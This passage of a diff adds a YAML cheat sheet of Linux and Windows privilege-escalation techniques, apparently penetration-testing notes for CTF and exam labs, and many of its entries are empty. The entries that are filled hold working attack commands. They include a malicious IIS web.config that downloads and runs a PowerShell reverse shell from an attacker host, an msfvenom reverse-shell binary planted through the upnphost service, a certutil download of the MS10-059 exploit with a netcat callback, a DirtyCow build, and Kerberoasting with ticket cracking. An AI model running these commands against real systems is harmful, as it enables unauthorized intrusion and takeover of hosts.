+          - https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells
+      privesc_bof:
+        description: craft exploit for the buffer overflow vulnerability to gain elevated privileges
+        cli: |
+        references:
+          - 
+      privesc_chkrootkit:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_credsreuse:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_cron:
+        description: leverage cronjobs to modify and execute `root` owned files
+        cli: |
+          crontab -l
+          cat /etc/crontab
+        references:
+          - 
+      privesc_cron_rootjobs:
+        description: it would be useful to find `root` owned cronjob processes
+        cli: |
+          pspy # find root owned processes, cronjobs
+          find / -type f -mmin -60 -ls 2>/dev/null # look for recently modified files since a user may not be able to see cron jobs by root
+          ./CheckcronJob.sh # find background processes
+        references:
+          - https://www.reddit.com/r/oscp/comments/gb4k83/htb_bashed_and_my_learnings_oscp_journey/
+      privesc_ctf_usertxt_timestamp:
+        description: a neat trick for ctf boxes is to use `user.txt` file time as a reference to search for recently modified files
+        cli: |
+          ls -lh /home/<username>/user.txt
+        references:
+          - https://0x00sec.org/t/enumeration-for-linux-privilege-escalation/1959/19
+      privesc_dirtycow:
+        description: race condition that allows breakage of private read-only memory mappings
+        cli: |
+          wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+          gcc -pthread -o dc dc.c -lcrypt
+          ./dc
+        references:
+          - https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+      privesc_docker_group:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_freebsd:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_iis_webconfig:
+        description: on iis servers, the web.config file stores configuration data for web applications (similar to .htaccess on apacher server). it can contain asp code which will be executed by the web server. use the powershell reverse shell from [nishang framework](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) to get a call back from uploaded web.config file
+        cli: |
+          sample web.config:
+            <?xml version="1.0" encoding="UTF-8"?>
+              <configuration>
+                  <system.webServer>
+                    <handlers accessPolicy="Read, Script, Write">
+                       <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+                    </handlers>
+                    <security>
+                       <requestFiltering>
+                          <fileExtensions>
+                             <remove fileExtension=".config" />
+                          </fileExtensions>
+                          <hiddenSegments>
+                             <remove segment="web.config" />
+                          </hiddenSegments>
+                       </requestFiltering>
+                    </security>
+                 </system.webServer>
+              </configuration>
+              <%@ Language=VBScript %>
+              <%
+                call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('<attackerip>/Invoke-PowerShellTcp.ps1')")
+              %>
+        references:
+          - https://0xdf.gitlab.io/2018/10/27/htb-bounty.html
+      privesc_kerberos_kerberosting:
+        description: allows us to extract administrator tickets and crack those to obtain administrator password
+        cli: |
+          # add entry for target system within /etc/hosts
+          GetUserSPNs.py -request active.htb/SVC_TGS -outputfile ./adminticket
+          john --format=krb5tgs --wordlist /usr/share/wordlists/rockyou.txt ./adminticket # does not work on john v1.8.0.6-jumbo-1-bleeding
+          psexec.py administrator@active.htb
+        references:
+          - https://0xrick.github.io/hack-the-box/active/
+          - https://room362.com/post/2016/kerberoast-pt1/
+          - https://room362.com/post/2016/kerberoast-pt2/
+          - https://room362.com/post/2016/kerberoast-pt3/
+      privesc_kernel_ipappend:
+        description: Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5/4.8 / Fedora Core 4/5/6 x86)
+        cli: |
+          gcc -m32 -o exploit 9542.c -Wl,--hash-style=both
+        references:
+          - https://www.exploit-db.com/exploits/9542
+          - https://nvd.nist.gov/vuln/detail/CVE-2009-2698
+      privesc_kernel_overlayfs:
+        description: 
+        cli: |
+        references:
+          -
+      privesc_modssl:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_mysql_creds:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_mysql_root:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_mysql_udf:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_nfs_norootsquash:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_nmap:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_passwd_writable:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_psexec_login:
+        description: If credentials for an administrative user are available, we can use `psexec.py` to connect and gain elevated access to the target system.
+        cli: |
+          psexec <username>@<targetip>
+        references:
+          - 
+      privesc_setuid:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_shell_escape:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_ssh_authorizedkeys:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_ssh_knownhosts:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_strace_setuid:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_sudo:
+        description: using `sudo` to execute programs that run with elevated privileges
+        cli: |
+        references:
+          - 
+      privesc_sudoers:
+        description: being able to edit the `/etc/sudoers` file to give a user elevated privileges
+        cli: |
+        references:
+          - 
+      privesc_tmux_rootsession:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_windows_upnphost:
+        description: On a Windows XP system, we can modify the insecurely configured `upnphost` service to gain elevated privileges. This can be done by creating a reverse shell binary and getting it executed by restarting the vulnerable service.
+        cli: |
+          msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -a x86 --platform windows -f exe -o pe.exe
+          # upload pe.exe file to the target system
+          sudo nc -nlvp <attackerport>
+
+          sc config upnphost binpath= "C:\Inetpub\wwwroot\pe.exe"
+          sc qc upnphost
+          sc config upnphost obj= ".\LocalSystem" password= ""
+          sc config SSDPSRV start= auto
+          net start SSDPSRV
+          net start upnphost
+        references:
+          - https://www.hackingdream.net/2020/03/windows-privilege-escalation-cheatsheet-for-oscp.html
+      privesc_windows_ms10_059:
+        description:
+        cli: |
+          wget https://github.com/abatchy17/WindowsExploits/raw/master/MS10-059%20-%20Chimichurri/MS10-059.exe
+          sharehttp 8080
+          certutil.exe -urlcache -split -f "http://<attackerip>:8080/MS10-059.exe" pe.exe
+          nc -nlvp 444
+          pe.exe <attackerip> 444
+        references:
+          - https://medium.com/@_C_3PJoe/htb-retired-box-write-up-arctic-50eccccc560
+          - https://github.com/abatchy17/WindowsExploits/tree/master/MS10-059%20-%20Chimichurri
+      privesc_windows_ms11_046:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_windows_ms14_070:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_windows_ms15_051:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_windows_ms16_032:
+        description: 
+        cli: |
+        references:
+          - 
+      privesc_windows_ms16_098:
+        description: 
+        cli: |
+        references:
+          - 
